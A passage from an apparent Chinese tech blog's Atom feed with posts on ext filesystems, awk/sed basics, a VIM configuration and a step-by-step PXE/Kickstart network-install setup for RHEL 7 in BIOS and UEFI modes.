-j&#x5C06;ex2&#x8F6C;&#x6362;&#x6210;ext3</p><table><thead><tr><th>&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;</th><th>&#x6700;&#x5927;&#x6587;&#x4EF6;&#x540D;&#x79F0;&#x957F;&#x5EA6;</th><th>&#x6700;&#x5927;&#x8DEF;&#x5F84;&#x540D;&#x957F;&#x5EA6;</th><th>&#x6700;&#x5927;&#x6587;&#x4EF6;&#x5927;&#x5C0F;</th><th>&#x6700;&#x5927;&#x5377;&#x5927;&#x5C0F;</th></tr></thead><tbody><tr><td>ext2</td><td>255bytes</td><td>&#x6CA1;&#x6709;&#x5B9A;&#x4E49;&#x9650;&#x5236;</td><td>2TB</td><td>32TB</td></tr><tr><td>ext3</td><td>255bytes</td><td>&#x6CA1;&#x6709;&#x5B9A;&#x4E49;&#x9650;&#x5236;</td><td>2TB</td><td>32TB</td></tr><tr><td>ext4</td><td>255bytes</td><td>&#x6CA1;&#x6709;&#x5B9A;&#x4E49;&#x9650;&#x5236;</td><td>16TB</td><td>1 EB</td></tr></tbody></table><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;EXT&amp;#x6269;&amp;#x5C55;&amp;#x6587;&amp;#x4EF6;&amp;#x7CFB;&amp;#x7EDF;&amp;#xFF08;&amp;#x65E5;&amp;#x5FD7;&amp;#x6587;&amp;#x4EF6;&amp;#x7CFB;&amp;#x7EDF;&amp;#xFF09;&quot;&gt;&lt;a href=&quot;#EXT&amp;#
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Linux文本四剑客</title>
    <link href="https://marnm.github.io//posts/b7f1c6/"/>
    <id>https://marnm.github.io//posts/b7f1c6/</id>
    <published>2022-06-07T04:38:58.000Z</published>
    <updated>2022-06-07T05:21:59.973Z</updated>
    
    <content type="html"><![CDATA[<h2 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h2><pre><code class="shell">line1 f2 f3line2 f4 f5line3 f6 f7echo -e &quot;line1 f2 f3\nline2 f4 f5\nline3 f6 f7&quot; | awk &apos;{print &quot;Line No:&quot;NR&quot;, No of fields:&quot;NF, &quot;$0=&quot;$0, &quot;$1=&quot;$1, &quot;$2=&quot;$2, &quot;$3=&quot;$3}&apos; Line No:1, No of fields:3 $0=line1 f2 f3 $1=line1 $2=f2 $3=f3Line No:2, No of fields:3 $0=line2 f4 f5 $1=line2 $2=f4 $3=f5Line No:3, No of fields:3 $0=line3 f6 f7 $1=line3 $2=f6 $3=f7</code></pre><a id="more"></a><h3 id="&#x589E;&#x5220;&#x6539;&#x67E5;"><a href="#&#x589E;&#x5220;&#x6539;&#x67E5;" class="headerlink" title="&#x589E;&#x5220;&#x6539;&#x67E5;"></a>&#x589E;&#x5220;&#x6539;&#x67E5;</h3><h4 id="&#x6DFB;&#x52A0;&#x64CD;&#x4F5C;"><a href="#&#x6DFB;&#x52A0;&#x64CD;&#x4F5C;" class="headerlink" title="&#x6DFB;&#x52A0;&#x64CD;&#x4F5C;"></a>&#x6DFB;&#x52A0;&#x64CD;&#x4F5C;</h4><h4 id="&#x5220;&#x9664;&#x64CD;&#x4F5C;"><a href="#&#x5220;&#x9664;&#x64CD;&#x4F5C;" class="headerlink" title="&#x5220;&#x9664;&#x64CD;&#x4F5C;"></a>&#x5220;&#x9664;&#x64CD;&#x4F5C;</h4><h4 id="&#x4FEE;&#x6539;&#x64CD;&#x4F5C;"><a href="#&#x4FEE;&#x6539;&#x64CD;&#x4F5C;" class="headerlink" title="&#x4FEE;&#x6539;&#x64CD;&#x4F5C;"></a>&#x4FEE;&#x6539;&#x64CD;&#x4F5C;</h4><h4 id="&#x67E5;&#x8BE2;&#x64CD;&#x4F5C;"><a href="#&#x67E5;&#x8BE2;&#x64CD;&#x4F5C;" class="headerlink" title="&#x67E5;&#x8BE2;&#x64CD;&#x4F5C;"></a>&#x67E5;&#x8BE2;&#x64CD;&#x4F5C;</h4><h3 id="&#x66FF;&#x6362;"><a href="#&#x66FF;&#x6362;" class="headerlink" title="&#x66FF;&#x6362;"></a>&#x66FF;&#x6362;</h3><h4 id="&#x66FF;&#x6362;&#x5B57;&#x7B26;"><a href="#&#x66FF;&#x6362;&#x5B57;&#x7B26;" class="headerlink" title="&#x66FF;&#x6362;&#x5B57;&#x7B26;"></a>&#x66FF;&#x6362;&#x5B57;&#x7B26;</h4><h4 id="&#x66FF;&#x6362;&#x6570;&#x5B57;"><a href="#&#x66FF;&#x6362;&#x6570;&#x5B57;" class="headerlink" title="&#x66FF;&#x6362;&#x6570;&#x5B57;"></a><strong>&#x66FF;&#x6362;&#x6570;&#x5B57;</strong></h4><h4 id="&#x66FF;&#x6362;&#x82F1;&#x6587;"><a href="#&#x66FF;&#x6362;&#x82F1;&#x6587;" class="headerlink" title="&#x66FF;&#x6362;&#x82F1;&#x6587;"></a><strong>&#x66FF;&#x6362;&#x82F1;&#x6587;</strong></h4><h4 id="&#x66FF;&#x6362;&#x7A7A;&#x884C;"><a href="#&#x66FF;&#x6362;&#x7A7A;&#x884C;" class="headerlink" title="&#x66FF;&#x6362;&#x7A7A;&#x884C;"></a><strong>&#x66FF;&#x6362;&#x7A7A;&#x884C;</strong></h4><h3 id="&#x6B63;&#x5219;&#x8868;&#x8FBE;&#x5F0F;"><a href="#&#x6B63;&#x5219;&#x8868;&#x8FBE;&#x5F0F;" class="headerlink" title="&#x6B63;&#x5219;&#x8868;&#x8FBE;&#x5F0F;"></a>&#x6B63;&#x5219;&#x8868;&#x8FBE;&#x5F0F;</h3><h4 id="&#x6807;&#x51C6;"><a href="#&#x6807;&#x51C6;" class="headerlink" title="&#x6807;&#x51C6;"></a><strong>&#x6807;&#x51C6;</strong></h4><h4 id="&#x6269;&#x5C55;"><a href="#&#x6269;&#x5C55;" class="headerlink" title="&#x6269;&#x5C55;"></a><strong>&#x6269;&#x5C55;</strong></h4><h3 id="&#x6761;&#x4EF6;"><a href="#&#x6761;&#x4EF6;" class="headerlink" title="&#x6761;&#x4EF6;"></a>&#x6761;&#x4EF6;</h3><h3 id="&#x5217;&#x64CD;&#x4F5C;"><a href="#&#x5217;&#x64CD;&#x4F5C;" class="headerlink" title="&#x5217;&#x64CD;&#x4F5C;"></a>&#x5217;&#x64CD;&#x4F5C;</h3><h3 id="&#x884C;&#x64CD;&#x4F5C;"><a href="#&#x884C;&#x64CD;&#x4F5C;" class="headerlink" title="&#x884C;&#x64CD;&#x4F5C;"></a>&#x884C;&#x64CD;&#x4F5C;</h3><p>&#x6253;&#x5370;&#x7B2C;&#x4E00;&#x884C;</p><pre><code class="shell">awk &apos;NR==1{print}&apos; /tmp/tmp.txt</code></pre><h2 id="sed"><a href="#sed" class="headerlink" title="sed"></a>sed</h2><h3 id="&#x884C;&#x64CD;&#x4F5C;-1"><a href="#&#x884C;&#x64CD;&#x4F5C;-1" class="headerlink" title="&#x884C;&#x64CD;&#x4F5C;"></a>&#x884C;&#x64CD;&#x4F5C;</h3><p><strong>&#x6DFB;&#x52A0;&#x5185;&#x5BB9;&#x5230;&#x9996;&#x884C;</strong></p><pre><code class="shell"># &#x57FA;&#x672C;&#x8BED;&#x6CD5;&#xFF0C;&#xFF08;&#x7A7A;&#x683C;&#x53EF;&#x4EE5;&#x7701;&#x7565;&#xFF09;# i&#x5728;&#x5F53;&#x524D;&#x884C;&#x63D2;&#x5165;&#x5185;&#x5BB9;# a&#x5728;&#x5F53;&#x524D;&#x884C;&#x8FFD;&#x52A0;&#x5185;&#x5BB9;sed &apos;&#x4F5C;&#x7528;&#x8303;&#x56F4;&#x884C; &#x63D2;&#x5165;&#x884C;&#x524D;/&#x540E; &#x63D2;&#x5165;&#x5185;&#x5BB9;&apos; &#x6587;&#x4EF6;&#x540D;# &#x5728;file.txt&#x6587;&#x4EF6;&#x7B2C;1&#x884C;&#x524D;&#x9762;&#x63D2;&#x5165;hellosed -i &apos;1 i hello&apos; file.txt# &#x5728;file.txt&#x6587;&#x4EF6;&#x7B2C;1&#x884C;&#x540E;&#x9762;&#x63D2;&#x5165;worldsed -i &apos;1 a world&apos; file.txt</code></pre><p><strong>&#x6DFB;&#x52A0;&#x5185;&#x5BB9;&#x5230;&#x6307;&#x5B9A;&#x884C;</strong></p><pre><code class="shell"># &#x5728;&#x7B2C;3&#x884C;&#x524D;&#x9762;&#x63D2;&#x5165;&#x5185;&#x5BB9;sed -i &apos;3i hello &apos; file.txt</code></pre><p><strong>&#x5728;&#x6700;&#x540E;&#x4E00;&#x884C;&#x63D2;&#x5165;&#x5185;&#x5BB9;</strong></p><pre><code class="shell"># $&#x8868;&#x793A;&#x6700;&#x540E;&#x4E00;&#x884C;sed -i &apos;$a hello&apos; sample.txt</code></pre><h3 id="&#x5217;&#x64CD;&#x4F5C;-1"><a href="#&#x5217;&#x64CD;&#x4F5C;-1" class="headerlink" title="&#x5217;&#x64CD;&#x4F5C;"></a>&#x5217;&#x64CD;&#x4F5C;</h3><h3 id="&#x6B63;&#x5219;&#x8868;&#x8FBE;&#x5F0F;-1"><a href="#&#x6B63;&#x5219;&#x8868;&#x8FBE;&#x5F0F;-1" class="headerlink" title="&#x6B63;&#x5219;&#x8868;&#x8FBE;&#x5F0F;"></a>&#x6B63;&#x5219;&#x8868;&#x8FBE;&#x5F0F;</h3><h2 id="grep"><a href="#grep" class="headerlink" title="grep"></a>grep</h2><h3 id="&#x6B63;&#x5219;&#x8868;&#x8FBE;&#x5F0F;-2"><a href="#&#x6B63;&#x5219;&#x8868;&#x8FBE;&#x5F0F;-2" class="headerlink" title="&#x6B63;&#x5219;&#x8868;&#x8FBE;&#x5F0F;"></a>&#x6B63;&#x5219;&#x8868;&#x8FBE;&#x5F0F;</h3><h2 id="find"><a href="#find" class="headerlink" title="find"></a>find</h2><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;awk&quot;&gt;&lt;a href=&quot;#awk&quot; class=&quot;headerlink&quot; title=&quot;awk&quot;&gt;&lt;/a&gt;awk&lt;/h2&gt;&lt;pre&gt;&lt;code class=&quot;shell&quot;&gt;line1 f2 f3
line2 f4 f5
line3 f6 f7
echo -e &amp;quot;line1 f2 f3\nline2 f4 f5\nline3 f6 f7&amp;quot; | awk &amp;#39;{print &amp;quot;Line No:&amp;quot;NR&amp;quot;, No of fields:&amp;quot;NF, &amp;quot;$0=&amp;quot;$0, &amp;quot;$1=&amp;quot;$1, &amp;quot;$2=&amp;quot;$2, &amp;quot;$3=&amp;quot;$3}&amp;#39; 
Line No:1, No of fields:3 $0=line1 f2 f3 $1=line1 $2=f2 $3=f3
Line No:2, No of fields:3 $0=line2 f4 f5 $1=line2 $2=f4 $3=f5
Line No:3, No of fields:3 $0=line3 f6 f7 $1=line3 $2=f6 $3=f7

&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>VIM的使用</title>
    <link href="https://marnm.github.io//posts/b382711f/"/>
    <id>https://marnm.github.io//posts/b382711f/</id>
    <published>2022-06-07T04:38:35.000Z</published>
    <updated>2022-06-07T05:22:22.484Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://gitee.com/fnaichu/mypicbed/raw/master/img/202205111548935.png" alt=""></p><p><strong>VIM&#x57FA;&#x672C;&#x914D;&#x7F6E;</strong></p><pre><code class="vimrc">&quot; &#x8BBE;&#x5B9A;&#x9ED8;&#x8BA4;&#x89E3;&#x7801; set fenc=utf-8set fencs=utf-8,usc-bom,euc-jp,gb18030,gbk,gb2312,cp936&quot; &#x4FA6;&#x6D4B;&#x6587;&#x4EF6;&#x7C7B;&#x578B;filetype on &quot; &#x8F7D;&#x5165;&#x6587;&#x4EF6;&#x7C7B;&#x578B;&#x63D2;&#x4EF6; filetype plugin on  &quot; &#x8BED;&#x6CD5;&#x9AD8;&#x4EAE; syntax enablesyntax on &quot; &#x4E0D;&#x8981;&#x5907;&#x4EFD;&#x6587;&#x4EF6;&#xFF08;&#x6839;&#x636E;&#x81EA;&#x5DF1;&#x9700;&#x8981;&#x53D6;&#x820D;&#xFF09; set nobackup &quot; &#x4E0D;&#x8981;&#x751F;&#x6210;swap&#x6587;&#x4EF6;&#xFF0C;&#x5F53;buffer&#x88AB;&#x4E22;&#x5F03;&#x7684;&#x65F6;&#x5019;&#x9690;&#x85CF;&#x5B83; setlocal noswapfile set bufhidden=hide &quot; &#x4F7F;&#x56DE;&#x683C;&#x952E;&#xFF08;backspace&#xFF09;&#x6B63;&#x5E38;&#x5904;&#x7406;indent, eol, start&#x7B49; set backspace=2 &quot; &#x7EE7;&#x627F;&#x524D;&#x4E00;&#x884C;&#x7684;&#x7F29;&#x8FDB;&#x65B9;&#x5F0F;&#xFF0C;&#x7279;&#x522B;&#x9002;&#x7528;&#x4E8E;&#x591A;&#x884C;&#x6CE8;&#x91CA; set autoindent &quot; &#x4E3A;C&#x7A0B;&#x5E8F;&#x63D0;&#x4F9B;&#x81EA;&#x52A8;&#x7F29;&#x8FDB; set smartindent &quot;&#x4F7F;&#x7528;C&#x6837;&#x5F0F;&#x7684;&#x7F29;&#x8FDB; set cindent &quot; &#x5236;&#x8868;&#x7B26;&#x4E3A;4 set tabstop=4 &quot; &#x7EDF;&#x4E00;&#x7F29;&#x8FDB;&#x4E3A;4 set softtabstop=4 set shiftwidth=4 set cindent &quot;c/c++&#x81EA;&#x52A8;&#x7F29;&#x8FDB;&quot;set smartindentset autoindent&quot;&#x53C2;&#x8003;&#x4E0A;&#x4E00;&#x884C;&#x7684;&#x7F29;&#x8FDB;&#x65B9;&#x5F0F;&#x8FDB;&#x884C;&#x81EA;&#x52A8;&#x7F29;&#x8FDB;&quot;filetype indent on &quot;&#x6839;&#x636E;&#x6587;&#x4EF6;&#x7C7B;&#x578B;&#x8FDB;&#x884C;&#x7F29;&#x8FDB;&quot;set softtabstop=4 &quot;4 character as a tab&quot;set shiftwidth=4set smarttab </code></pre><p><strong>VIM&#x9ED8;&#x8BA4;&#x4E3B;&#x9898;&#x63A8;&#x8350;</strong></p><ul><li>darkblue</li><li>delek</li></ul><p><strong>&#x4EE5;&#x5341;&#x516D;&#x8FDB;&#x5236;&#x67E5;&#x770B;&#x6587;&#x4EF6;</strong></p><pre><code>%!xxd</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;https://gitee.com/fnaichu/mypicbed/raw/master/img/202205111548935.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;VIM&amp;#x57FA;&amp;#x672C;&amp;#x914D;&amp;#x7F6
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>PXE自动化部署</title>
    <link href="https://marnm.github.io//posts/97717e94/"/>
    <id>https://marnm.github.io//posts/97717e94/</id>
    <published>2022-06-07T04:37:37.000Z</published>
    <updated>2022-06-07T05:22:42.827Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><h3 id="PXE-Kickstart"><a href="#PXE-Kickstart" class="headerlink" title="PXE/Kickstart"></a>PXE/Kickstart</h3><h4 id="BIOS&#x6A21;&#x5F0F;"><a href="#BIOS&#x6A21;&#x5F0F;" class="headerlink" title="BIOS&#x6A21;&#x5F0F;"></a>BIOS&#x6A21;&#x5F0F;</h4><p>&#x914D;&#x7F6E;&#x7F51;&#x7EDC;&#x670D;&#x52A1;&#x5668;&#xFF08;NFS&#xFF0C;HTTPS&#xFF0C;HTTP&#xFF0C;FTP&#xFF09;&#x7528;&#x4E8E;&#x5B58;&#x50A8;ISO&#x955C;&#x50CF;<br><strong>&#x914D;&#x7F6E;DHCP</strong></p><pre><code class="bash">yum install -y dhcpcp /usr/share/doc/dhcp*/dhcpd.conf.example /etc/dhcp/dhcpd.confvim /etc/dhcp/dhcpd.conf</code></pre><pre><code class="bash">allow booting;allow bootp;ddns-update-style interim;ignore client-updates;subnet 192.168.10.0 netmask 255.255.255.0 {    option subnet-mask 255.255.255.0;    option domain-name-servers 192.168.10.10;    range dynamic-bootp 192.168.10.100 192.168.10.200;    default-lease-time 21600;    max-lease-time 43200;    next-server 192.168.10.10;    filename &quot;pxelinux.0&quot;; }</code></pre><pre><code class="bash">systemctl restart dhcpd &amp;&amp; systemctl enable dhcpd</code></pre><p><strong>&#x914D;&#x7F6E;tftp &#x63D0;&#x4F9B;&#x5F15;&#x5BFC;&#x6587;&#x4EF6;</strong></p><pre><code class="bash">yum install -y tftp-server xinetdvim /etc/xinet.d/tftpservice tftp {    socket_type = dgram    protocol = udp    wait = yes    user = root    server = /usr/sbin/in.tftpd    server_args = -s /var/lib/tftpboot    disable = no    per_source = 11    cps = 100 2    flags = IPv4systemctl restart xinetd &amp;&amp; systemctl enable xinetdfirewall-cmd --permanent --add-port=69/udpfirewall-cmd --reload</code></pre><p>&#x83B7;&#x53D6;pxelinux.0&#x6587;&#x4EF6;</p><pre><code class="bash"># &#x5B89;&#x88C5;syslinux&#x5305;yum install -y syslinuxcp /usr/share/syslinux/pxelinux.0 /var/lib/tftpboot/# &#x6216;# &#x76F4;&#x63A5;&#x52A0;&#x538B;rpm&#x5305;mount -t iso9660 /dev/cdrom /media/cdrom -o loop,rocp -pr /media/cdrom/Packages/syslinux-x.xx-xx.x86_64.rpm ./rpm2cpio syslinux-x.xx-xx.x86_64.rpm | cpio -dimv# &#x590D;&#x5236;pxelinux.0&#x5230;/var/lib/tftpboot/pxelinux/&#x4E2D; cp pxelinux.0 /var/lib/tftpboot/</code></pre><p>&#x590D;&#x5236;&#x5F15;&#x5BFC;&#x6587;&#x4EF6;&#x5230;tftp&#x6839;&#x76EE;&#x5F55;&#x4E2D;</p><pre><code class="bash">cp /media/cdrom/images/pxeboot/{vmlinuz,initrd.img} /var/lib/tftpboot/cp /media/cdrom/isolinux/{vesamenu.c32,boot.msg} /var/lib/tftpboot/</code></pre><p>&#x5F15;&#x5BFC;&#x83DC;&#x5355;default&#x6587;&#x4EF6;</p><pre><code class="bash"># &#x521B;&#x5EFA;&#x76EE;&#x5F55;mkdir /var/lib/tftpboot/pxelinux.cfg# &#x521B;&#x5EFA;&#x914D;&#x7F6E;&#x6587;&#x4EF6;vim /var/lib/tftpboot/pxelinux.cfg/default# &#x6216;cp /media/cdrom/isolinux/isolinux.cfg /var/lib/tftpboot/pxelinux.cfg/default</code></pre><p><strong>&#x914D;&#x7F6E;FTP</strong><br>&#x590D;&#x5236;&#x955C;&#x50CF;&#x5B89;&#x88C5;&#x6587;&#x4EF6;&#x5230;ftp&#x76EE;&#x5F55;</p><pre><code class="bash">yum install -y vsftpdcp -pvr /media/cdrom/* /var/ftp/pub/firewall-cmd --permanent --add-service=ftpfirewall-cmd --reloadsetsebool -P ftpd_connect_all_unreserved=onsystemctl restart vsftpd &amp;&amp; systemctl enable vsftpd</code></pre><p><strong>&#x521B;&#x5EFA;kickstart&#x914D;&#x7F6E;&#x6587;&#x4EF6;</strong><br>&#x751F;&#x6210;kickstart&#x6587;&#x4EF6;<br><a href="https://access.redhat.com/labs/kickstartconfig/" target="_blank" rel="noopener">&#x4F7F;&#x7528;&#x5728;&#x7EBF;&#x751F;&#x6210;&#x5668;&#xFF08;&#x9700;&#x8981;&#x6CE8;&#x518C;&#x767B;&#x5F55;&#xFF09;</a><br>&#x751F;&#x6210;&#x540E;&#x4E0B;&#x8F7D;&#x547D;&#x540D;&#x5B58;&#x653E;&#x5230;/var/ftp/pub/ks.cfg<br>&#x6216;<br>&#x4F7F;&#x7528;&#x7528;&#x6237;&#x76EE;&#x5F55;&#x4E0B;&#x7684;&#x9ED8;&#x8BA4;&#x6A21;&#x677F;anaconda-ks.cfg</p><pre><code class="bash">cp /root/anaconda-ks.cfg /var/ftp/pub/ks.cfgchmod +r /var/ftp/pub/ks.cfg</code></pre><pre><code>---------------------dhcpd.confg-------------------------- allow booting; allow bootp; ddns-update-style interim; ignore client-updates; subnet 192.168.10.0 netmask 255.255.255.0 {     option subnet-mask 255.255.255.0;     option domain-name-servers 192.168.10.10;     range dynamic-bootp 192.168.10.100 192.168.10.200;     default-lease-time 21600;     max-lease-time 43200;     next-server 192.168.10.10;     filename &quot;pxelinux.0&quot;; }</code></pre><pre><code>---------------------tftp-----------------------disable = no</code></pre><pre><code>---------------------default--------------------default linux...# 64 line &#x5730;&#x5740;&#x8981;&#x51C6;&#x786E;&#xFF0C;&#x955C;&#x50CF;&#x6587;&#x4EF6;&#x653E;&#x5728;&#x54EA;&#x4E2A;&#x76EE;&#x5F55;&#x5C31;&#x586B;&#x5230;&#x54EA;&#x4E2A;&#x76EE;&#x5F55;&#xFF0C;&#x9664;&#x975E;ftp&#x8BBE;&#x7F6E;&#x4E86;&#x9ED8;&#x8BA4;&#x76EE;&#x5F55;append initrd=initrd.img inst.stage2=ftp://192.168.128.120/pub ks=ftp://192.168.128.120/pub/ks.cfg quiet</code></pre><pre><code>---------------------ks.cfg---------------------# &#x7CFB;&#x7EDF;&#x8BA4;&#x8BC1;&#x8BBE;&#x7F6E;auth --enableshadown --passalgo=sha512# &#x6587;&#x4EF6;&#x670D;&#x52A1;&#x5730;&#x5740;# &#x5730;&#x5740;&#x8981;&#x51C6;&#x786E;&#xFF0C;&#x955C;&#x50CF;&#x6587;&#x4EF6;&#x653E;&#x5728;&#x54EA;&#x4E2A;&#x76EE;&#x5F55;&#x5C31;&#x586B;&#x5230;&#x54EA;&#x4E2A;&#x76EE;&#x5F55;url --url=ftp://192.168.128.120/pubfirstboot --enableignoredisk --only-use=sdakeyboard --vckeymap=us --xlayouts=&apos;us&apos;lang en_US.UTF-8network --bootproto=dhcp --device=eno16777728 --onboot=off --ipv6=autonetwork --hostname=localhost.localdomainrootpw --iscrypted $6$pDjJf42g8C6pL069$iI.PX/yFaqpo0ENw2pa7MomkjLyoae2zjMz2UZJ7b H3UO4oWtR1.Wk/hxZ3XIGmzGJPcs/MgpYssoi8hPCt8b/# &#x65F6;&#x533A;&#x8BBE;&#x7F6E;timezone Asia/Shanghai --isUtc# &#x5206;&#x533A;&#x65B9;&#x5F0F;clearpart --all --initlabel# &#x5B89;&#x88C5;rpm&#x5305; 31 %packages 32 @base 33 @core 34 @desktop-debugging 35 @dial-up 36 @fonts 37 @gnome-desktop 38 @guest-agents 39 @guest-desktop-agents 40 @input-methods 41 @internet-browser 42 @multimedia 43 @print-client 44 @x11 45  46 %end</code></pre><p>&#x68C0;&#x67E5;&#x670D;&#x52A1;&#x662F;&#x5426;&#x542F;&#x52A8;<br>systemctl status xinetd dhcpd</p><h4 id="UEFI&#x6A21;&#x5F0F;"><a href="#UEFI&#x6A21;&#x5F0F;" class="headerlink" title="UEFI&#x6A21;&#x5F0F;"></a>UEFI&#x6A21;&#x5F0F;</h4><p>&#x5728;BOIS&#x6A21;&#x5F0F;&#x7684;&#x57FA;&#x7840;&#x4E0A;&#x66F4;&#x65B0;&#x5982;&#x4E0B;&#x914D;&#x7F6E;&#xFF1A;</p><p>&#x66F4;&#x65B0;DHCP&#x7684;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF0C;&#x53C2;&#x8003;&#x6A21;&#x677F;</p><pre><code class="bash">## DHCP Server Configuration file.#   see /usr/share/doc/dhcp*/dhcpd.conf.example#   see dhcpd.conf(5) man page#allow booting;allow bootp;ddns-update-style interim;ignore client-updates;option rfc3442-classless-static-routes code 121 = array of integer 8;option ms-classless-static-routes code 249 = array of integer 8;option space pxelinux;option pxelinux.magic code 208 = string;option pxelinux.configfile code 209 = text;option pxelinux.pathprefix code 210 = text;option pxelinux.reboottime code 211 = unsigned integer 32;option architecture-type code 93 = unsigned integer 16;subnet 192.168.128.0 netmask 255.255.255.0 {    option subnet-mask 255.255.255.0;    option domain-name-servers 192.168.128.120;    range dynamic-bootp 192.168.128.128 192.168.128.200;    default-lease-time 21600;    max-lease-time 43200;    class &quot;pxeclients&quot;{        match if substring(option vendor-class-identifier, 0, 9)=&quot;PXEClient&quot;;        next-server 192.168.128.120;        if option architecture-type = 00:07 {            filename &quot;shim.efi&quot;;        } else {            filename &quot;pxelinux.0&quot;;        }    }}</code></pre><p>&#x590D;&#x5236;uefi&#x5F15;&#x5BFC;&#x6587;&#x4EF6;</p><pre><code class="bash">cp -pr /media/cdrom/Packages/shim-0.9-2.el7.x86_64.rpm cp -pr /media/cdrom/Packages/grub2-efi-2.02-0.44.el7.x86_64.rpmrpm2cpio shim-0.9-2.el7.x86_64.rpm | cpio -dimvrpm2cpio grub2-efi-2.02-0.44.el7.x86_64.rpm# &#x590D;&#x5236;&#x76F8;&#x5173;&#x5F15;&#x5BFC;&#x6587;&#x4EF6;&#x5230;tftpboot/&#x76EE;&#x5F55;&#x4E0B;cp ./bootloaders/boot/efi/EFI/redhat/shim.efi /var/lib/tftpboot/cp ./bootloaders/boot/efi/EFI/redhat/grubx64.efi /var/lib/tftpboot/</code></pre><p>&#x5728;/var/lib/tftpboot/&#x4E0B;&#x6DFB;&#x52A0;grub.cfg&#x914D;&#x7F6E;&#x6587;&#x4EF6;</p><pre><code class="bash">vim /var/lib/tftpboot/uefi/grub.cfg&#xFF1A;set timeout=60# menuentry &apos;RHEL 7&apos;&#x662F;&#x5F15;&#x5BFC;&#x7684;&#x83DC;&#x5355;&#x540D;&#x79F0;menuentry &apos;RHEL 7&apos; {    # vmlinuz&#x7684;&#x5B58;&#x653E;&#x76EE;&#x5F55;,&#x5982;&#x679C;&#x6587;&#x4EF6;&#x5B58;&#x653E;&#x5728;/var/lib/tftpboot/&#x76EE;&#x5F55;&#x4E0B;&#xFF0C;&#x76F4;&#x63A5;&#x5148;vmlinuz    linuxefi vmlinuz ip=dhcp    # &#x955C;&#x50CF;&#x5B89;&#x88C5;&#x6587;&#x4EF6;&#x7684;&#x5B58;&#x653E;&#x76EE;&#x5F55;    inst.repo=ftp://192.168.73.120/pub/    # initrd.img&#x6587;&#x4EF6;&#x7684;&#x5B58;&#x653E;&#x53D1;&#x76EE;&#x5F55;    initrdefi initrd.img}</code></pre><blockquote><p>&#x542F;&#x52A8;&#x6240;&#x6709;&#x670D;&#x52A1;systemctl restart xinetd dhcpd</p></blockquote><p>&#x590D;&#x5236;&#x955C;&#x50CF;&#x6587;&#x4EF6;&#x5230;uefi/&#x76EE;&#x5F55;&#x4E0B;</p><pre><code class="bash">cp /media/cdrom/images/pxeboot/{vmlinuz,initrd.img} /var/lib/tftpboot/</code></pre><p><strong>&#x67E5;&#x770B;LInux&#x5904;&#x4E8E;BIOS&#x6A21;&#x5F0F;&#x8FD8;&#x662F;UEFI&#x6A21;&#x5F0F;</strong></p><p>&#x5728;UEFI&#x6A21;&#x5F0F;&#x4E0B;Linux&#x7CFB;&#x7EDF;&#x5728;<code>/sys/firmware/</code>&#x76EE;&#x5F55;&#x4E0B;&#x5B58;&#x5728;<code>efi</code>&#x76EE;&#x5F55;&#xFF0C;BIOS&#x6A21;&#x5F0F;&#x662F;&#x6CA1;&#x6709;&#x8FD9;&#x4E2A;&#x76EE;&#x5F55;&#x7684;</p><pre><code class="bash">ls -ld /sys/firmware/efi/# BIOS&#x6A21;&#x5F0F;&#x4E0B;grub2&#x5F15;&#x5BFC;&#x6587;&#x4EF6;&#x4E3A;/etc/grub2.cfg# EFI&#x6A21;&#x5F0F;&#x4E0B;grub2&#x5F15;&#x5BFC;&#x6587;&#x4EF6;&#x4E3A;/etc/grub2-efi.cfg[root@pxelab tftpboot]# ls -lrt /etc/grub2.cfglrwxrwxrwx. 1 root root 22 Jan 22 17:31 /etc/grub2.cfg -&gt; ../boot/grub2/grub.cfg[root@pxelab ~]# ls -lrt /etc/grub2-efi.cfglrwxrwxrwx. 1 root root 31 Jan 24 07:18 /etc/grub2-efi.cfg -&gt; ../boot/efi/EFI/redhat/grub.cfg</code></pre><p>&#x5982;&#x679C;&#x662F;EFI&#x6A21;&#x5F0F;&#x7684;&#x7CFB;&#x7EDF;&#xFF0C;&#x6709;&#x5982;&#x4E0B;&#x76EE;&#x5F55;/&#x6587;&#x4EF6;&#xFF1A;</p><pre><code class="sh">[root@pxelab ~]# ls -lrt /etc/grub2-efi.cfglrwxrwxrwx. 1 root root 31 Jan 24 07:18 /etc/grub2-efi.cfg -&gt; ../boot/efi/EFI/redhat/grub.cfg[root@pxelab ~]# ls -ld /boot/efi/EFI/drwx------. 4 root root 4096 Jan 24 07:19 /boot/efi/EFI/[root@pxelab ~]# ls -lrt /boot/efi/EFI/total 8drwx------. 2 root root 4096 Jan 24 07:19 BOOTdrwx------. 3 root root 4096 Jan 24 07:21 redhat[root@pxelab ~]# ls -lrt /boot/efi/EFI/*/boot/efi/EFI/BOOT:total 1340-rwx------. 